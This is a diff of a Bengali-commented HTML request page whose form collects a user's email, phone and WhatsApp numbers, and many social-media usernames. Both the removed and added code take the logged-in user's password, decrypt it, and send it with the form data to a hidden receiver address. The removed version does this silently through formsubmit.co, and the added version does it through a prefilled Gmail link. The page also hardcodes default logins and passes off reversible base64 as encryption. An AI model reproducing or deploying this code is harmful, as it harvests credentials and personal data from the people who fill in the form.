@@ -138,70 +138,64 @@ hr{
 <div class="box" id="formBox">
 <h3>📋 আপনার তথ্য জমা দিন</h3>
 
-<form id="requestForm" action="https://formsubmit.co/inyt_444@outlook.com" method="POST">
+<form id="requestForm">
 
-<!-- আপনার ইমেইল (যেখানে রিপোর্ট যাবে) - এটা পরিবর্তন করুন -->
-<input type="hidden" name="_to" value="inyt_444@outlook.com">
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_subject" value="🔔 নতুন রিকুয়েস্ট ফর্ম জমা হয়েছে">
-<input type="hidden" name="_template" value="table">
+<!-- 📧 আপনার ইমেইল এড্রেস (যেখানে রিপোর্ট যাবে) - এখানে আপনার ইমেইল দিন -->
+<input type="hidden" id="receiverEmail" value="your_email@gmail.com">
 
 <!-- ১. Your Email -->
 <label>📧 1. Your Email</label>
-<input type="email" name="Your_Email" placeholder="example@gmail.com" required>
+<input type="email" id="yourEmail" placeholder="example@gmail.com" required>
 
 <!-- ২. Your Username -->
 <label>👤 2. Your Username</label>
-<input type="text" name="Your_Username" placeholder="john_doe">
+<input type="text" id="yourUsername" placeholder="john_doe">
 
 <!-- ৩. Your Profile Picture Link -->
 <label>🖼️ 3. Your Profile Picture Link</label>
-<input type="url" name="Your_Profile_Picture_Link" placeholder="https://example.com/photo.jpg">
+<input type="url" id="profilePic" placeholder="https://example.com/photo.jpg">
 
 <!-- ৪. Your Facebook Username -->
 <label>📘 4. Your Facebook Username</label>
-<input type="text" name="Your_Facebook_Username" placeholder="johndoe">
+<input type="text" id="fbUsername" placeholder="johndoe">
 
 <!-- ৫. Your Facebook Page Username -->
 <label>📘 5. Your Facebook Page Username</label>
-<input type="text" name="Your_Facebook_Page_Username" placeholder="johndoepage">
+<input type="text" id="fbPageUsername" placeholder="johndoepage">
 
 <!-- ৬. Your Instagram Username -->
 <label>📷 6. Your Instagram Username</label>
-<input type="text" name="Your_Instagram_Username" placeholder="@johndoe">
+<input type="text" id="igUsername" placeholder="@johndoe">
 
 <!-- ৭. Your WhatsApp Number -->
 <label>💬 7. Your WhatsApp Number</label>
-<input type="tel" name="Your_WhatsApp_Number" placeholder="+8801XXXXXXXXX">
+<input type="tel" id="whatsapp" placeholder="+8801XXXXXXXXX">
 
 <!-- ৮. Your TikTok Username -->
 <label>🎵 8. Your TikTok Username</label>
-<input type="text" name="Your_TikTok_Username" placeholder="@johndoe">
+<input type="text" id="tiktok" placeholder="@johndoe">
 
 <!-- ৯. Your Telegram Username -->
 <label>✈️ 9. Your Telegram Username</label>
-<input type="text" name="Your_Telegram_Username" placeholder="@johndoe">
+<input type="text" id="telegram" placeholder="@johndoe">
 
 <!-- ১০. Your Twitter (X) Username -->
 <label>🐦 10. Your Twitter (X) Username</label>
-<input type="text" name="Your_Twitter_Username" placeholder="@johndoe">
+<input type="text" id="twitter" placeholder="@johndoe">
 
 <!-- ১১. Your Phone Number -->
 <label>📞 11. Your Phone Number</label>
-<input type="tel" name="Your_Phone_Number" placeholder="+8801XXXXXXXXX">
+<input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
 
 <!-- ১২. Your About -->
 <label>📝 12. Your About</label>
-<textarea name="Your_About" placeholder="নিজের সম্পর্কে কিছু লিখুন..."></textarea>
+<textarea id="about" placeholder="নিজের সম্পর্কে কিছু লিখুন..."></textarea>
 
 <!-- ১৩. Your Website Link -->
 <label>🌐 13. Your Website Link</label>
-<input type="url" name="Your_Website_Link" placeholder="https://yourwebsite.com">
+<input type="url" id="website" placeholder="https://yourwebsite.com">
 
-<!-- লগইন করা ইউজারের তথ্য টেক্সট আকারে পাঠানো হবে -->
-<input type="hidden" id="loggedInUserInfo" name="Logged_In_User_Info" value="">
-
-<button type="submit" id="submitBtn">🚀 সাবমিট করুন</button>
+<button type="button" id="submitBtn" onclick="sendToGmail()">🚀 সাবমিট করুন</button>
 
 </form>
 
@@ -212,7 +206,6 @@ hr{
 
 <script>
 // =============== ইউজার ডাটাবেস (পাসওয়ার্ড এনক্রিপ্টেড) ===============
-// এনক্রিপশন ফাংশন (সিম্পল)
 function encrypt(pwd){
     return btoa(pwd.split('').reverse().join('') + 'fix2026');
 }
@@ -234,7 +227,7 @@ function loadUsers(){
     } else {
         // ডিফল্ট ইউজার: admin / 1234 , user1 / 1111 , user2 / 2222
         users = {
-            "admin": encrypt("admin"),
+            "admin": encrypt("1234"),
             "user1": encrypt("1111"),
             "user2": encrypt("2222")
         };
@@ -281,7 +274,7 @@ function logout(){
     updateSubmitButton();
 }
 
-// লগইন স্টেট অনুযায়ী সাবমিট বাটন ও ফর্ম কন্ট্রোল
+// লগইন স্টেট অনুযায়ী সাবমিট বাটন কন্ট্রোল
 function updateSubmitButton(){
     const submitBtn = document.getElementById("submitBtn");
     const formStatus = document.getElementById("formStatus");
@@ -299,29 +292,142 @@ function updateSubmitButton(){
     }
 }
 
-// পেজ লোডে বাটন স্টেট সেট করা
-updateSubmitButton();
-
-// =============== ফর্ম সাবমিট কন্ট্রোল + লগইন ইউজারের তথ্য যোগ করা ===============
-document.getElementById("requestForm").addEventListener("submit", function(e){
-    
+// =============== Gmail এ পাঠানোর ফাংশন ===============
+function sendToGmail(){
+    // চেক করা লগইন করা আছে কিনা
     if(!currentUser){
-        e.preventDefault();
         alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
         return;
     }
     
-    // লগইন করা ইউজারের তথ্য টেক্সট আকারে হিডেন ফিল্ডে সেট করা
-    const loggedInUserPassword = decrypt(users[currentUser]);
-    const loginInfo = `লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInUserPassword}`;
-    document.getElementById("loggedInUserInfo").value = loginInfo;
+    // ফর্মের সব ডাটা সংগ্রহ করা
+    let yourEmail = document.getElementById("yourEmail").value;
+    let yourUsername = document.getElementById("yourUsername").value;
+    let profilePic = document.getElementById("profilePic").value;
+    let fbUsername = document.getElementById("fbUsername").value;
+    let fbPageUsername = document.getElementById("fbPageUsername").value;
+    let igUsername = document.getElementById("igUsername").value;
+    let whatsapp = document.getElementById("whatsapp").value;
+    let tiktok = document.getElementById("tiktok").value;
+    let telegram = document.getElementById("telegram").value;
+    let twitter = document.getElementById("twitter").value;
+    let phone = document.getElementById("phone").value;
+    let about = document.getElementById("about").value;
+    let website = document.getElementById("website").value;
     
-    // ফর্ম সাবমিট হবে (formsubmit.co এ যাবে)
-    alert("✅ ফর্ম জমা হচ্ছে... আপনার তথ্য ইমেইলে চলে যাবে!");
+    // ইমেইল ভ্যালিডেশন
+    if(!yourEmail){
+        alert("❌ অনুগ্রহ করে আপনার ইমেইল এড্রেস দিন!");
+        return;
+    }
     
-    // ছোট একটু ডিলে দেওয়া যেতে পারে (কিছু করতে চাইলে)
-    return true;
-});
+    if(!yourEmail.includes('@') || !yourEmail.includes('.')){
+        alert("❌ সঠিক ইমেইল এড্রেস দিন!");
+        return;
+    }
+    
+    // রিসিভারের ইমেইল (যেখানে রিপোর্ট যাবে)
+    let receiverEmail = document.getElementById("receiverEmail").value;
+    
+    // লগইন করা ইউজারের পাসওয়ার্ড ডিক্রিপ্ট করা
+    let loggedInPassword = decrypt(users[currentUser]);
+    
+    // ইমেইলের সাবজেক্ট
+    let subject = `🔔 নতুন রিকুয়েস্ট ফর্ম জমা হয়েছে - ${yourUsername || yourEmail}`;
+    
+    // ইমেইলের বডি তৈরি করা (সুন্দর ফরম্যাটে)
+    let body = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 নিচের তথ্য জমা দেওয়া হয়েছে:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+👤 লগইন তথ্য:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ইউজারনেম: ${currentUser}
+পাসওয়ার্ড: ${loggedInPassword}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📝 ব্যবহারকারীর দেওয়া তথ্য:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📧 ১. ইমেইল: ${yourEmail}
+👤 ২. ইউজারনেম: ${yourUsername || "দেওয়া হয়নি"}
+🖼️ ৩. প্রোফাইল ছবি লিংক: ${profilePic || "দেওয়া হয়নি"}
+📘 ৪. ফেসবুক ইউজারনেম: ${fbUsername || "দেওয়া হয়নি"}
+📘 ৫. ফেসবুক পেইজ ইউজারনেম: ${fbPageUsername || "দেওয়া হয়নি"}
+📷 ৬. ইনস্টাগ্রাম ইউজারনেম: ${igUsername || "দেওয়া হয়নি"}
+💬 ৭. হোয়াটসঅ্যাপ নম্বর: ${whatsapp || "দেওয়া হয়নি"}
+🎵 ৮. টিকটক ইউজারনেম: ${tiktok || "দেওয়া হয়নি"}
+✈️ ৯. টেলিগ্রাম ইউজারনেম: ${telegram || "দেওয়া হয়নি"}
+🐦 ১০. টুইটার (X) ইউজারনেম: ${twitter || "দেওয়া হয়নি"}
+📞 ১১. ফোন নম্বর: ${phone || "দেওয়া হয়নি"}
+📝 ১২. সম্পর্কে: ${about || "দেওয়া হয়নি"}
+🌐 ১৩. ওয়েবসাইট লিংক: ${website || "দেওয়া হয়নি"}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD')}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+এই ইমেইলটি অটোমেটিক জেনারেট করা হয়েছে।
+ধন্যবাদ! 🙏
+`;
+    
+    // এনকোড করা (URL encoding for mailto)
+    let encodedSubject = encodeURIComponent(subject);
+    let encodedBody = encodeURIComponent(body);
+    
+    // Gmail mailto লিংক তৈরি করা
+    let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${receiverEmail}&su=${encodedSubject}&body=${encodedBody}`;
+    
+    // মোবাইল ডিভাইস চেক করা
+    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    if(isMobile){
+        // মোবাইলে Gmail অ্যাপ ওপেন হবে (যদি ইনস্টল থাকে)
+        window.location.href = `intent://mail/${receiverEmail}#Intent;scheme=mailto;package=com.google.android.gm;action=android.intent.action.SENDTO;S.browser_fallback_url=https://mail.google.com;end`;
+        
+        // ফallback যদি intent কাজ না করে
+        setTimeout(() => {
+            window.open(gmailLink, '_blank');
+        }, 500);
+    } else {
+        // ডেস্কটপে Gmail ওপেন হবে
+        window.open(gmailLink, '_blank');
+    }
+    
+    // স্ট্যাটাস মেসেজ দেখানো
+    let formStatus = document.getElementById("formStatus");
+    formStatus.innerHTML = '<div class="status-success">✅ Gmail ওপেন হচ্ছে! দয়া করে ইমেইল চেক করে Send এ ক্লিক করুন।</div>';
+    
+    // ৩ সেকেন্ড পর স্ট্যাটাস ক্লিয়ার করা
+    setTimeout(() => {
+        if(formStatus.innerHTML.includes('Gmail ওপেন হচ্ছে')){
+            formStatus.innerHTML = '<div class="status-success">✅ ফর্ম সফলভাবে প্রস্তুত! ইমেইল পাঠানোর জন্য Send বাটনে ক্লিক করুন।</div>';
+        }
+    }, 3000);
+    
+    // অপশনাল: ফর্ম ক্লিয়ার করার জন্য (চাইলে কমেন্ট আউট করুন)
+    // clearForm();
+}
+
+// ফর্ম ক্লিয়ার করার ফাংশন (প্রয়োজনে ব্যবহার করুন)
+function clearForm(){
+    document.getElementById("yourEmail").value = "";
+    document.getElementById("yourUsername").value = "";
+    document.getElementById("profilePic").value = "";
+    document.getElementById("fbUsername").value = "";
+    document.getElementById("fbPageUsername").value = "";
+    document.getElementById("igUsername").value = "";
+    document.getElementById("whatsapp").value = "";
+    document.getElementById("tiktok").value = "";
+    document.getElementById("telegram").value = "";
+    document.getElementById("twitter").value = "";
+    document.getElementById("phone").value = "";
+    document.getElementById("about").value = "";
+    document.getElementById("website").value = "";
+}
+
+// পেজ লোডে বাটন স্টেট সেট করা
+updateSubmitButton();
 
 // পেজ রিফ্রেশ করলেও লগইন স্টেট চেক
 window.onload = function(){
